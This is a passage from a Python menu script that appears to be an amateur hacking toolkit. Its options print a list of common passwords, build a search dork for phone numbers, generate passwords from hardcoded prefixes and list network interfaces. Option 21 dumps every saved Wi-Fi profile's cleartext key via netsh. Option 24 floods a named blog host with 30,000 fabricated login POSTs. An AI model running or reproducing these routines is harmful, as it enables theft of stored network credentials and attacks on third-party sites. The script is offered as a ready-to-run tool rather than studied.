   print(g1331)
   print(g1332)
   print(g1333)
   print(g1334)
   print(g1335)
   print(g1336)
   print(g1337)
   print(g1338)
   print(g1339)
   print(g1340)
   print(g1341)
   print(g1342)
   print(g1343)
   print(g1344)
   print(g1345)
   print(g1346)
   print(g1347)
   print(g1348)
   print(g1349)
   print(g1350)
   print(g1351)
   print(g1352)
   print(g1353)
   print(g1354)
   print(g1355)
   print(g1356)
   print(g1357)
   print(g1358)
   print(g1359)
   print(g1360)
   print(g1361)
   print(g1362)
   print(g1363)
   print(g1364)
   print(g1365)
   print(g1366)
   print(g1367)
   print(g1368)
   print(g1369)
   print(g1370)
   print(g1371)
   print(g1372)
   print(g1373)
   print(g1374)
   print(g1375)
   print(g1376)
   print(g1377)
   print(g1378)
   print(g1379)
   print(g1380)
   print(g1381)
   print(g1382)
   print(g1383)
   print(g1384)
   print(g1385)
   print(g1386)
   print(g1387)
   print(g1388)
   print(g1389)
   print(g1390)
   print(g1391)
   print(g1392)
   print(g1393)
   print(g1394)
   print(g1395)
   print(g1396)
   print(g1397)
   print(g1398)
   print(g1399)
   print(g1400)
   print(g1401)
   print(g1402)
   print(g1403)
   print(g1404)
   print(g1405)
   print(g1406)
   print(g1407)
   print(g1408)
   print(g1409)
   print(g1410)
   print(g1411)
   print(g1412)
   print(g1413)
   print(g1414)
   print(g1415)
   print(g1416)
   print(g1417)
   print(g1418)
   print(g1419)
   print(g1420)
   print(g1421)
   print(g1422)
   print(g1423)
   print(g1424)
   print(g1425)
   print(g1426)
   print(g1427)
   print(g1428)
   print(g1429)
   print(g1430)
   print(g1431)
   print(g1432)
   print(g1433)
   print(g1434)
   print(g1435)
   print(g1436)
   print(g1437)
   print(g1438)
   print(g1439)
   print(g1440)
   print(g1441)
   print(g1442)
   print(g1443)
   print(g1444)
   print(g1445)
   print(g1446)
   print(g1447)
   print(g1448)
   print(g1449)
   print(g1450)
   print(g1451)
   print(g1452)
   print(g1453)
   print(g1454)
   print(g1455)
   print(g1456)
   print(g1457)
   print(g1458)
   print(g1459)
   print(g1460)
   print(g1461)
   print(g1462)
   print(g1463)
   print(g1464)
   print(g1465)
   print(g1466)
   print(g1467)
   print(g1468)
   print(g1469)
   print(g1470)
   print(g1471)
   print(g1472)
   print(g1473)
   print(g1474)
   print(g1475)
   print(g1476)
   print(g1477)
   print(g1478)
   print(g1479)
   print(g1480)
   print(g1481)
   print(g1482)
   print(g1483)
   print(g1484)
   print(g1485)
   print(g1486)
   print(g1487)
   print(g1488)
   print(g1489)
   print(g1490)
   print(g1491)
   print(g1492)
   print(g1493)
   print(g1494)
   print(g1495)
   print(g1496)
   print(g1497)
   print(g1498)
   print(g1499)
   print(g1500)
   print(g1501)
   print(g1502)
   print(g1503)
   print(g1504)
   print(g1505)
   print(g1506)
   print(g1507)
   print(g1508)
   print(g1509)
   print("qwertyui")       	
   print("qazwsxedc")	
   print("122345678")		
   print("123456789")		
   print("qwertyuio")
   print("qwertyuiop")
   print("qazwsxedcrfv")
   print("1234556")
   print("password")
   print("helloworld")
   print("11112222")
   print("11223344")
   print("147258369")
   print("angry")
   print("1234")
   print("qwertyuiqwertyui")
   print("qwertyui$")
   print("qwertyuiqwertyuio$$")
   print("qwertyui$$")
   print("admin")
######################################################################################################
elif option == 18:
    nam1 = input("enter namer (ex= 989399999999) ==> ")
    nam2 = input(" enter number(ex = +989999000729 ==>  )")
    nam3 = input("enter number (ex= 09334000000) ==> ")
    nam4 = input("enter number(ex = 0933 444 4444) ==> ")
    info = f'https://intext:"{nam1}" OR intext:"{nam2}" OR intext:"{nam3}" OR intext:"{nam4}" '
    sms = info
    print("____________________________________________________________")
    print("Please open your web browser and search for this sentence \n")
    print("===>:",sms)
    print("____________________________________________________________")
######################################################################################################
elif option == 19:

    print("[1] gmail")
    print("[2] fi website")
    print("[3] website")
    print("[4] account")
    print("_______________________")
    option = int (input("$ Enter your option: ==> "))

    if option == 1:

        np = ("ynu7aerj6wpebmv8myf160w5ltb2js")
        print("________________________________________________")
        a = input("where this password used ? ")
        password = (np + a)
        print("________________________________________________")
        print("your password is ==> " , password)
        print("________________________________________________")
        
    elif option == 2:

        np = ("6zsdf5qb8q")
        print("________________________________________________")
        a = input("where this password used ? ")
        password = (np + a)
        print("________________________________________________")
        print("your password is ==> " , password)
        print("________________________________________________")

    elif option == 3:
        
        np = ("az6k7ce2")
        print("________________________________________________")
        a = input("where this password used ? ")
        password = (np + a)
        print("________________________________________________")
        print("your password is ==> " , password)
        print("________________________________________________")

    elif option == 4:

        np = ("pkmqct4f16pa8hgbv1ao4zsxw0ckxc")
        print("________________________________________________")
        a = input("where this password used ? ")
        password = (np + a)
        print("________________________________________________")
        print("your password is ==> " , password)
        print("________________________________________________")
######################################################################################################
elif option == 20:

    class Network_Details(object):
        def __init__(self):
            self.instance = psutil.net_if_addrs()


        def scanner(self):
            self.interfaces = []
            self.address_ip = []
            self.netmask_ip = []
            self.broadcast_ip = []
            for interface_name, interface_addresses in self.instance.items():
                self.interfaces.append(interface_name)
                for address in interface_addresses:
                    if str(address.family) == 'AddressFamily.AF_INET':
                        self.address_ip.append(address.address)
                        self.netmask_ip.append(address.netmask)
                        self.broadcast_ip.append(address.broadcast)
            data = {"Interface"    : [*self.interfaces],
                    "IP-Address"   : [*self.address_ip],  
                    "Netmask"      : [*self.netmask_ip],
                    "Broadcast-IP" : [*self.netmask_ip]
                    }
            return tabulate(data, headers="keys", tablefmt="github")
        

        def __str__(self):
            return str(self.scanner())


    if __name__ == "__main__":
        print(Network_Details())
######################################################################################################
elif option == 21:
    data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8', errors="backslashreplace").split('\n')
    profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
    for i in profiles:
        try:
            results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8', errors="backslashreplace").split('\n')
            results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
            try:
                print ("{:<30}|  {:<}".format(i, results[0]))
            except IndexError:
                print ("{:<30}|  {:<}".format(i, ""))
        except subprocess.CalledProcessError:
            print ("{:<30}|  {:<}".format(i, "ENCODING ERROR"))
    input("")
######################################################################################################
elif option == 22:
    print("____________________________")
    print("exp 'site.com/login'")
    print("____________________________")
    sitepage = input("enter u site :==> ")
    page = urllib.request.urlopen(sitepage)
    print(page.read())
######################################################################################################
elif option == 23:
    
    url = input('Enter url ==> ')
    reqs = requests.get(url)
    soup = BeautifulSoup(reqs.text, 'html.parser')
    urls = []
    for link in soup.find_all('a'):
        print(link.get('href'))
        
elif option == 24:
    def id_generator(size=6, chars=string.ascii_uppercase + string.digits):
        return ''.join(random.choice(chars) for _ in range(size))

    for i in range(30000):
        username = id_generator(randint(8, 24))
        password = id_generator(randint(8, 24))

        files = {
            'email': (None, '{}@email.com'.format(username)),
            'passwd': (None, password),
        }
        print("+++++++++++++++++++++++++++++++++++++++++++++++")
        print("Requets number: {}".format(i))
        print("Gmail:{}\nPassword:{}".format('{}@gmail.com'.format(username), password))
        response = requests.post("http://ali29.blogfa.com/", files=files)
######################################################################################################